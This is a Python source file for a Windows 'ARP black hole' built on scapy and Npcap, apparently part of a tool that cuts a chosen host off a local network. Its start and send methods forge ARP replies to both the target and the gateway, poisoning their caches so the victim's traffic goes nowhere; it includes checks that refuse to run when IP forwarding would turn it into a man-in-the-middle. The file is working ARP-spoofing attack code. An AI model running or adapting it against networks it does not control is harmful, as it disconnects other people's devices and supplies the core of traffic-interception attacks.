"""Windows ARP black hole using scapy + Npcap.

Same contract as ``arpguard.ArpBlackhole``: two-way poison, periodic refresh,
always restored on stop. No packet forwarding: if Windows IP forwarding is on
the block refuses rather than silently becoming a MITM.
"""
from __future__ import annotations

import ipaddress
import logging
import threading
import time

import platform_ops
from arpguard import ArpBlackhole as _BaseBlackhole

log = logging.getLogger("cutoff.arpguard.win")


def ip_forward_enabled() -> bool:
    rc, out, _ = platform_ops.powershell(
        "(Get-NetIPInterface -AddressFamily IPv4 -ErrorAction SilentlyContinue | "
        "Where-Object {$_.Forwarding -eq 'Enabled'} | Measure-Object).Count")
    return rc == 0 and out.strip() not in ("", "0")


class ArpBlackhole(_BaseBlackhole):
    def start(self) -> tuple[bool, str]:
        for name, value in (("target ip", self.victim_ip),
                            ("gateway ip", self.gateway_ip)):
            try:
                ipaddress.IPv4Address(value)
            except ValueError:
                return False, f"invalid {name}: {value}"
        if self.victim_mac == self.our_mac:
            return False, "refusing to intercept this host's own MAC"
        if not self.gateway_mac or not self.victim_mac:
            return False, "gateway/victim MAC is unknown"
        if ip_forward_enabled() and not self.forward_blocked:
            return False, ("Windows IP forwarding is enabled; disable it or this "
                           "would be a MITM, not a block")
        try:
            from scapy.all import conf  # type: ignore
        except ImportError:
            return False, "scapy/Npcap missing — run the Windows setup (run.bat) once"
        try:
            self._iface_obj = conf.ifaces.dev_from_name(self.iface)
        except Exception:  # noqa: BLE001
            self._iface_obj = self.iface
        self.started_at = time.time()
        self._send_all(poison=True)
        if self.error or self.sent == 0:
            return False, f"ARP send failed: {self.error or 'no packets sent (Npcap/admin?)'}"
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name=f"arp-blackhole-{self.victim_ip}")
        self._thread.start()
        return True, (f"black-holing {self.victim_ip} "
                      f"({len(self.pairs)} ARP pairs, total={self.total})")

    def _send_pair(self, pair: dict, poison: bool) -> None:
        from scapy.all import ARP, Ether, sendp  # type: ignore

        sender_mac = self.our_mac if poison else pair["real_mac"]
        packet = (
            Ether(src=self.our_mac, dst=pair["dst_mac"])
            / ARP(op=2, hwsrc=sender_mac, psrc=pair["spoof_ip"],
                  hwdst=pair["dst_mac"], pdst=pair["dst_ip"])
        )
        try:
            sendp(packet, iface=getattr(self, "_iface_obj", self.iface), verbose=0)
            self.sent += 1
        except Exception as exc:  # noqa: BLE001 - Npcap errors vary
            self.error = str(exc)
